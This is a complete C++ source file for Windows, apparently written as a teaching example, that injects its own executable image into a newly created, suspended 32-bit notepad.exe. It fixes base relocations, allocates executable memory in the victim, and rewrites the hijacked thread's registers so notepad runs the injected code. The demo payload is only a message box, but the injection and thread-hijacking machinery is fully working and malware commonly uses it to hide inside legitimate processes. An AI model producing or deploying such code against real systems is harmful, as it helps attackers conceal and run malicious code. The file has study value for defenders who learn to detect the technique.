/*********************************************************************************/
/*       in this example we create a hijacked process by changing it's           */
/*         entry point before it starts then reusming it's execution.            */
/*																			     */
/*					  victim process : notepad.exe (32bit)			             */
/*																			     */
/*            minimum supported systems : windows 10 version 1709,               */
/*                      windows server 2016 version 1709                         */
/*********************************************************************************/

// reqiured header files 
#include <cstdio>
#include <Windows.h>

// required structures for ntdll apis .
typedef struct UNICODE_STRING {
	USHORT cch;
	USHORT max_cch;
	WCHAR* buffer;
} *PUNICODE_STRING, * LPUNICODE_STRING;
typedef struct ANSI_STRING {
	USHORT cch;
	USHORT max_cch;
	CHAR* buffer;
} *PANSI_STRING, * LPANSI_STRING;
typedef struct CLIENT_ID {
	LPVOID process_id;
	LPVOID thread_id;
} *PCLIENT_id, * LPCLIENT_id;
typedef struct OBJECT_ATTRIBUTES {
	ULONG  Length;
	HANDLE RootDirectory;
	LPUNICODE_STRING ObjectName;
	ULONG  Attributes;
	PVOID  SecurityDescriptor;
	PVOID  SecurityQualityOfService;
} *POBJECT_ATTRIBUTES, * LPOBJECT_ATTRIBUTES;

// required function to inject our pe into the target process and fix required pe base relocations .
LPBYTE __stdcall PE_Injection(IN HANDLE);

// new remote main .
INT NewMain(HANDLE[]);

// our entry point .
INT main() {

	// get kernel32.dll base address .
	HMODULE kernel32 = LoadLibraryW(L"kernel32.dll");
	if (!kernel32) {
		printf_s("LoadLibraryW() failed with 0x%X \n", GetLastError());
		return 0x0;
	}

	// resolve required kernel32.dll apis .
	LPBYTE lp_CreateProccessW = (LPBYTE)GetProcAddress(kernel32, "CreateProcessW");
	LPBYTE lp_TerminateProcess = (LPBYTE)GetProcAddress(kernel32, "TerminateProcess");
	LPBYTE lp_InitializeProcThreadAttributeList = (LPBYTE)GetProcAddress(kernel32, "InitializeProcThreadAttributeList");
	LPBYTE lp_UpdateProcThreadAttribute = (LPBYTE)GetProcAddress(kernel32, "UpdateProcThreadAttribute");
	LPBYTE lp_GetThreadContext = (LPBYTE)GetProcAddress(kernel32, "GetThreadContext");
	LPBYTE lp_SetThreadContext = (LPBYTE)GetProcAddress(kernel32, "SetThreadContext");
	LPBYTE lp_SuspendThread = (LPBYTE)GetProcAddress(kernel32, "SuspendThread");
	LPBYTE lp_ResumeThread = (LPBYTE)GetProcAddress(kernel32, "ResumeThread");
	LPBYTE lp_WaitForSingleObject = (LPBYTE)GetProcAddress(kernel32, "WaitForSingleObject");
	LPBYTE lp_DuplicateHandle = (LPBYTE)GetProcAddress(kernel32, "DuplicateHandle");
	LPBYTE lp_GetCurrentProcess = (LPBYTE)GetProcAddress(kernel32, "GetCurrentProcess");
	LPBYTE lp_CloseHandle = (LPBYTE)GetProcAddress(kernel32, "CloseHandle");

	if (!lp_CreateProccessW || !lp_GetThreadContext || !lp_InitializeProcThreadAttributeList || !lp_ResumeThread || !lp_SetThreadContext || !lp_SuspendThread ||
		!lp_TerminateProcess || !lp_UpdateProcThreadAttribute || !lp_WaitForSingleObject || !lp_CloseHandle || !lp_DuplicateHandle || !lp_GetCurrentProcess) {
		FreeLibrary(kernel32);
		printf_s("GetProcAddress() failed with 0x%X \n", GetLastError());
		return 0x0;
	}

	STARTUPINFOW startup_info = { 0x0 };
	PROCESS_INFORMATION process_info = { 0x0 };

	// creaate the target process as a child processs to our process .
	if (!((BOOL(__stdcall*)(IN LPCWSTR, IN OUT LPCWSTR, IN LPSECURITY_ATTRIBUTES, IN LPSECURITY_ATTRIBUTES, IN BOOL, IN DWORD, IN LPVOID, IN LPCWSTR,
		IN LPSTARTUPINFOW, OUT LPPROCESS_INFORMATION))lp_CreateProccessW)(L"C:\\Windows\\SysWOW64\\notepad.exe", NULL, (LPSECURITY_ATTRIBUTES)0x0,
			(LPSECURITY_ATTRIBUTES)0x0, FALSE, 0x0, (LPVOID)0x0, (LPCWSTR)0x0, &startup_info, &process_info)) {
		FreeLibrary(kernel32);
		printf_s("CreateProcessW() failed with 0x%X \n", GetLastError());
		return 0x0;
	}

	// suspend the target process's primary thread .
	((BOOL(__stdcall*)(HANDLE))lp_SuspendThread)(process_info.hThread);

	// inject our into the address space of the target process .
	LPBYTE remote_base = PE_Injection(process_info.hProcess);

	if (remote_base == NULL) {
		((BOOL(__stdcall*)(HANDLE, UINT))lp_TerminateProcess)(process_info.hProcess, EXIT_FAILURE);
		FreeLibrary(kernel32);
		return 0x0;
	}

	CONTEXT thread_context = { 0x0 };
	thread_context.ContextFlags = CONTEXT_FULL;

	// get the target processs's primary thread context ( cpu registers values ) .
	if (!((BOOL(__stdcall*)(HANDLE, CONTEXT*))lp_GetThreadContext)(process_info.hThread, &thread_context)) {
		((BOOL(__stdcall*)(HANDLE, UINT))lp_TerminateProcess)(process_info.hProcess, EXIT_FAILURE);
		FreeLibrary(kernel32);
		printf_s("GetThreadContext() failed with 0x%X \n", GetLastError());
		return 0x0;
	}

	// get a handle to our process 
	HANDLE cph = ((HANDLE(__stdcall*)())lp_GetCurrentProcess)();
	HANDLE duplicated_handle = (HANDLE)0x0;

	// duplicate our prcoess's handle and obtain a new handle which is valid only in the target process and refers to the same handle .
	if (!((BOOL(__stdcall*)(HANDLE, HANDLE, HANDLE, LPHANDLE, ACCESS_MASK, BOOL, DWORD))lp_DuplicateHandle)(cph, cph, process_info.hProcess, &duplicated_handle,
		PROCESS_TERMINATE, FALSE, DUPLICATE_CLOSE_SOURCE) || duplicated_handle == (HANDLE)0x0) {
		((BOOL(__stdcall*)(HANDLE, UINT))lp_TerminateProcess)(process_info.hProcess, EXIT_FAILURE);
		FreeLibrary(kernel32);
		printf_s("DuplicateHandle() failed with 0x%X \n", GetLastError());
		return 0x0;
	}

	// allocate some memory into the tartget process's virtual space for the duplicated handle .
	HANDLE* remote_param = (HANDLE*)VirtualAllocEx(process_info.hProcess, 0x0, sizeof HANDLE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// write the duplicated handle value to the previously allocated buffer .
	if (!WriteProcessMemory(process_info.hProcess, remote_param, &duplicated_handle, sizeof HANDLE, NULL)) {
		((BOOL(__stdcall*)(HANDLE, UINT))lp_TerminateProcess)(process_info.hProcess, EXIT_FAILURE);
		FreeLibrary(kernel32);
		printf_s("WriteProcessMemory() failed with %d \n", GetLastError());
		return 0x0;
	}

	/* change the value of the Ebx register to the previously allocated buffer address( the address of the duplicated handle) ,we choose Ebx because on 32bit processes
	( native x86 or Wow64 ) the thread's parameter is put on the Ebx . */
	thread_context.Ebx = (DWORD)remote_param;

	/* change the value of the Eax register to the address of the previously declared NewMain() function, we choose Eax because each thread in a 32bit process 
	( native x86 or Wow64 ) gets it's entry point address from the Eax register ( this work is done by BaseThreadInitThunk() ) . */
	thread_context.Eax = (DWORD)((DWORD)remote_base + ((DWORD)NewMain - (DWORD)GetModuleHandleW(NULL)));
	
	// after changing the values of Eax and Ebx we must set the thread context again
	if (!((BOOL(__stdcall*)(HANDLE, CONTEXT*))lp_SetThreadContext)(process_info.hThread, &thread_context)) {
		((BOOL(__stdcall*)(HANDLE, UINT))lp_TerminateProcess)(process_info.hProcess, EXIT_FAILURE);
		FreeLibrary(kernel32);
		printf_s("SetThreadContext() failed with 0x%X \n", GetLastError());
		return 0x0;
	}

	// after setting the thread context, we resume the thread execution by calling ResumeThread() .
	((BOOL(__stdcall*)(HANDLE))lp_ResumeThread)(process_info.hThread);

	// we wait until the target process finish it's execution .
	((DWORD(__stdcall*)(HANDLE, DWORD))lp_WaitForSingleObject)(process_info.hProcess, 0xffffffff);

	// do our cleanup
	((BOOL(__stdcall*)(HANDLE))lp_CloseHandle)(process_info.hThread);
	VirtualFreeEx(process_info.hProcess, remote_param, sizeof HANDLE, MEM_RELEASE | MEM_DECOMMIT);
	((BOOL(__stdcall*)(HANDLE))lp_CloseHandle)(process_info.hProcess);

	printf_s("process terminated successfully \n");

	// dereferencing the kernel32.dll module handle .
	FreeLibrary(kernel32);
	return 0x0;
}

LPBYTE __stdcall PE_Injection(IN HANDLE target_process) {
	if (target_process == (HANDLE)0x0) {
		printf_s("PE_Injection() : invalid process handle \n");
		return NULL;
	}

	// get ntdll.dll base address .
	HMODULE ntdll = LoadLibraryA("ntdll.dll");

	// get kernel32.dll base address .
	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
	if (!ntdll) {
		printf_s("LoadLibraryA() failed with 0x%X \n", GetLastError());
		return NULL;
	}
	if (!kernel32) {
		FreeLibrary(ntdll);
		printf_s("GetModuelHandleA() failed with 0x%X \n", GetLastError());
		return NULL;
	}

	// resolve ntdll.dll apis .
	LPBYTE lp_LdrGetProcedureAddress = (LPBYTE)GetProcAddress(ntdll, "LdrGetProcedureAddress");
	LPBYTE lp_RtlInitAnsiString = (LPBYTE)GetProcAddress(ntdll, "RtlInitAnsiString");

	if (!lp_LdrGetProcedureAddress || !lp_RtlInitAnsiString) {
		FreeLibrary(ntdll);
		printf_s("GetProcAddress() failed with 0x%X \n", GetLastError());
		return NULL;
	}

	LPBYTE lp_RtlImageNtHeader = (LPBYTE)0x0;
	LPBYTE lp_NtClose = (LPBYTE)0x0;
	LPBYTE lp_IsWow64Process2 = (LPBYTE)0x0;
	LPBYTE lp_GetModuleHandleA = (LPBYTE)0x0;
	LPBYTE lp_NtAllocateVirtualMemory = (LPBYTE)0x0;
	LPBYTE lp_NtWriteVirtualMemory = (LPBYTE)0x0;
	LPBYTE lp_NtFreeVirtualMemory = (LPBYTE)0x0;
	LPBYTE lp_CreateRemoteThread = (LPBYTE)0x0;
	LPBYTE lp_GetCurrentProcess = (LPBYTE)0x0;
	LPBYTE lp_WaitForSingleObject = (LPBYTE)0x0;

	// resolve ntdll.dll and kernel32.dll required apis
	ANSI_STRING function_name = { 0x0 };
	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "RtlImageNtHeader");
	NTSTATUS nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(ntdll, &function_name,
		0x0, &lp_RtlImageNtHeader);
	if (nt_code != 0x0 || !lp_RtlImageNtHeader) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "CreateRemoteThread");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(kernel32, &function_name,
		0x0, &lp_CreateRemoteThread);
	if (nt_code != 0x0 || !lp_CreateRemoteThread) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "NtClose");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(ntdll, &function_name,
		0x0, &lp_NtClose);
	if (nt_code != 0x0 || !lp_NtClose) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "IsWow64Process2");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(kernel32, &function_name,
		0x0, &lp_IsWow64Process2);
	if (nt_code != 0x0 || !lp_IsWow64Process2) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "WaitForSingleObject");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(kernel32, &function_name,
		0x0, &lp_WaitForSingleObject);
	if (nt_code != 0x0 || !lp_WaitForSingleObject) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "GetCurrentProcess");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(kernel32, &function_name,
		0x0, &lp_GetCurrentProcess);
	if (nt_code != 0x0 || !lp_GetCurrentProcess) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "GetModuleHandleA");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(kernel32, &function_name,
		0x0, &lp_GetModuleHandleA);
	if (nt_code != 0x0 || !lp_GetModuleHandleA) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "NtAllocateVirtualMemory");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(ntdll, &function_name,
		0x0, &lp_NtAllocateVirtualMemory);
	if (nt_code != 0x0 || !lp_NtAllocateVirtualMemory) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "NtWriteVirtualMemory");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(ntdll, &function_name,
		0x0, &lp_NtWriteVirtualMemory);
	if (nt_code != 0x0 || !lp_NtWriteVirtualMemory) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	((void(__stdcall*)(PANSI_STRING, LPCSTR))lp_RtlInitAnsiString)(&function_name, "NtFreeVirtualMemory");
	nt_code = ((NTSTATUS(__stdcall*)(HMODULE, PANSI_STRING, WORD, LPBYTE*))lp_LdrGetProcedureAddress)(ntdll, &function_name,
		0x0, &lp_NtFreeVirtualMemory);
	if (nt_code != 0x0 || !lp_NtFreeVirtualMemory) {
		FreeLibrary(ntdll);
		printf_s("LdrGetProcedureAddress() failed with 0x%X \n", nt_code);
		return NULL;
	}

	USHORT process_type = IMAGE_FILE_MACHINE_UNKNOWN;

	// check the target process architecture 
	if (!((BOOL(__stdcall*)(HANDLE, USHORT*, USHORT*))lp_IsWow64Process2)(target_process, &process_type, (USHORT*)0)) {
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("IsWow64Process2() failed with 0x%X \n", GetLastError());
		return NULL;
	}

	// as our processs is a 32bit process, the target processs pust also be a 32bit one .
	if (process_type != IMAGE_FILE_MACHINE_I386) {
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("You can't perform a PE injection into that process ( ERROR: bitness mismatch ) \n");
		return NULL;
	}

	/* reqs: 
		- the previous check of the target process architecture using IsWow64Process2() is required only if the target system is 64bit, otherwise this step is
			 not required at all .
		- if your system is a 32bit one, you should remove the previous step bacause IsWow64Process2() may not exist at all and this can cause a problem .
	*/

	// retreive the pe headers of our module ( the main module of our process < the main module is the one who has the .exe extension > ) .
	PIMAGE_NT_HEADERS nt_headers = ((PIMAGE_NT_HEADERS(__stdcall*)(HMODULE))lp_RtlImageNtHeader)(((HMODULE(__stdcall*)(LPCSTR))lp_GetModuleHandleA)((LPCSTR)0));
	if (!nt_headers) {
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("RtlImageNtHeader() failed with 0x%X \n", GetLastError());
		return NULL;
	}

	LPBYTE image_copy = (LPBYTE)0;
	SIZE_T bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;

	// allocate a local buffer of the same size as our image ( module ) wit read/write permissions .
	nt_code = ((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T, SIZE_T*, ULONG, ULONG))lp_NtAllocateVirtualMemory)(((HANDLE(__stdcall*)())lp_GetCurrentProcess)(),
		(LPVOID*)&image_copy, 0x0, &bytes_allocated, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (nt_code != 0 || image_copy == (LPBYTE)0 || bytes_allocated < nt_headers->OptionalHeader.SizeOfImage) {
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("NtAllocateVirtualMemory() failed with 0x%X \n", nt_code);
		return NULL;
	}

	SIZE_T bytes_written = 0x0;

	// write our image to the previously allocated buffer
	nt_code = ((NTSTATUS(__stdcall*)(HANDLE, LPVOID, LPBYTE, SIZE_T, SIZE_T*))lp_NtWriteVirtualMemory)(((HANDLE(__stdcall*)())lp_GetCurrentProcess)(), image_copy,
		(LPBYTE)((HMODULE(__stdcall*)(LPCSTR))lp_GetModuleHandleA)((LPCSTR)0), nt_headers->OptionalHeader.SizeOfImage, &bytes_written);
	if (nt_code != 0x0 || bytes_written < nt_headers->OptionalHeader.SizeOfImage) {
		bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;
		((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T*, ULONG))lp_NtFreeVirtualMemory)(((HANDLE(__stdcall*)())lp_GetCurrentProcess)(), (LPVOID*)&image_copy,
		    &bytes_allocated, MEM_RELEASE | MEM_DECOMMIT);
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("NtFreeVirtualMemory() failed with 0x%X \n", nt_code);
		return NULL;
	}

	LPBYTE injected_pe = (LPBYTE)0;
	bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;

	// allocate a remote buffer of the same size as our image into the address space of the target process with execute/read/write permissions .
	nt_code = ((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T, SIZE_T*, ULONG, ULONG))lp_NtAllocateVirtualMemory)(target_process,
		(LPVOID*)&injected_pe, 0x0, &bytes_allocated, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (nt_code != 0 || injected_pe == (LPBYTE)0 || bytes_allocated < nt_headers->OptionalHeader.SizeOfImage) {
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("NtAllocateVirtualMemory() failed with 0x%X \n", nt_code);
		return NULL;
	}


	// check if there is required relocations to fix .
	if (nt_headers->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC &&
		nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &&
		nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0x0) {
		// get the address of the first base relocations block .
		/*
			a base relocation block is a data structure that represents relocations of one page, it starts with a 32bit field that holds the offset of the page, 
			after it there also a 32bit field that holds the size of the block in bytes, followoing that there is a variable number of base relocation descriptors 
		*/
		PIMAGE_BASE_RELOCATION basereloc_block = (PIMAGE_BASE_RELOCATION)(image_copy + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		if (!basereloc_block) {
			bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;
			((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T*, ULONG))lp_NtFreeVirtualMemory)(((HANDLE(__stdcall*)())lp_GetCurrentProcess)(), (LPVOID*)&image_copy,
				&bytes_allocated, MEM_RELEASE | MEM_DECOMMIT);
			bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;
			((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T*, ULONG))lp_NtFreeVirtualMemory)(target_process, (LPVOID*)&injected_pe,
				&bytes_allocated, MEM_RELEASE | MEM_DECOMMIT);
			((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
			FreeLibrary(ntdll);
			printf_s("PE_Injection() : ERROR => BAD MEMORY ADDRESS \n");
			return NULL;
		}
		// loop over all base relocation blocks
		while (basereloc_block && basereloc_block->VirtualAddress) {
			// check if there is at least one base relocation descriptor
			/* req:
				a base relocation descriptor is a 16bit block devided into two parts: the low 12bits is an offset in the base relocation block to which the descriptor
				belongs. The high 4bits is a flag that determines the relocation type ( generally it is HIGH_LOW )
			*/
			if (basereloc_block->SizeOfBlock >= sizeof IMAGE_BASE_RELOCATION) {

				// get the address of the first base relocation descriptor
				PWORD basereloc_descriptor = (PWORD)((LPBYTE)basereloc_block + sizeof IMAGE_BASE_RELOCATION);

				// loop over all descriptors
				for (UINT i = 0x0; i < ((basereloc_block->SizeOfBlock - sizeof IMAGE_BASE_RELOCATION) / 0x2); i++) {
					if ((basereloc_descriptor[i] & 0xfff) != 0x0) {
						// first, we must substract the old delta value that was added to apply base relocations in our original pe
						/*
							req: this step is not generally required in most systems as in my case because currently the ImageBase member of the optional header equals
							to the address of the module when it is first loaded (it is the same as the value returned by GetModuleHandleW() ) .  
						*/
						*(DWORD*)(image_copy + basereloc_block->VirtualAddress + (basereloc_descriptor[i] & 0xfff)) -= (DWORD)((DWORD)((HMODULE(__stdcall*)(LPCSTR))lp_GetModuleHandleA)((LPCSTR)0) - nt_headers->OptionalHeader.ImageBase);
						
						// second: we apply a base relocation to the remote pe by adding the new delta value to the virtual adddress discribed by the descriptor
						*(DWORD*)(image_copy + basereloc_block->VirtualAddress + (basereloc_descriptor[i] & 0xfff)) += (DWORD)((DWORD)injected_pe - nt_headers->OptionalHeader.ImageBase);
					}
				}
			}
			basereloc_block = (PIMAGE_BASE_RELOCATION)((LPBYTE)basereloc_block + basereloc_block->SizeOfBlock);
		}
	}

	bytes_written = 0x0;

	// after applying base relocations our pe is ready for mapping into the address space of the target process
	nt_code = ((NTSTATUS(__stdcall*)(HANDLE, LPVOID, LPBYTE, SIZE_T, SIZE_T*))lp_NtWriteVirtualMemory)(target_process, injected_pe,
		image_copy, nt_headers->OptionalHeader.SizeOfImage, &bytes_written);
	if (nt_code != 0x0 || bytes_written < nt_headers->OptionalHeader.SizeOfImage) {
		bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;
		((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T*, ULONG))lp_NtFreeVirtualMemory)(((HANDLE(__stdcall*)())lp_GetCurrentProcess)(), (LPVOID*)&image_copy,
			&bytes_allocated, MEM_RELEASE | MEM_DECOMMIT);
		bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;
		((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T*, ULONG))lp_NtFreeVirtualMemory)(target_process, (LPVOID*)&injected_pe,
			&bytes_allocated, MEM_RELEASE | MEM_DECOMMIT);
		((NTSTATUS(__stdcall*)(HANDLE))lp_NtClose)(target_process);
		FreeLibrary(ntdll);
		printf_s("NtWriteVirtualMemory() failed with 0x%X \n", nt_code);
		return NULL;
	}

	bytes_allocated = nt_headers->OptionalHeader.SizeOfImage;

	// after finishing the mapping successfully, we free the locale copy of our pe because we won't need it after that
	((NTSTATUS(__stdcall*)(HANDLE, LPVOID*, SIZE_T*, ULONG))lp_NtFreeVirtualMemory)(((HANDLE(__stdcall*)())lp_GetCurrentProcess)(), (LPVOID*)&image_copy,
		&bytes_allocated, MEM_RELEASE | MEM_DECOMMIT);

	DWORD old_protect = 0x0;

	// finally, we change the protection of the injected pe from PAGE_EXECUTE_READWRITE to just PAGE_EXECUTE to disable write access
	VirtualProtectEx(target_process, injected_pe, nt_headers->OptionalHeader.SizeOfImage, PAGE_EXECUTE, &old_protect);

	// dereferencing the ntdll.dll module handle
	FreeLibrary(ntdll);
	
	// return the remote address of the injected pe
	return injected_pe;
}

INT NewMain(HANDLE handles_list[]) {
	if (handles_list[0x0]) {
		MessageBoxA(0, "handle duplication succeeded", "NewMain()", MB_OK | MB_ICONINFORMATION);
		CloseHandle(handles_list[0x0]);
	}
	else MessageBoxA(0, "handle duplication failed", "NewMain()", MB_OKCANCEL | MB_ICONERROR);
	return 0x0;
}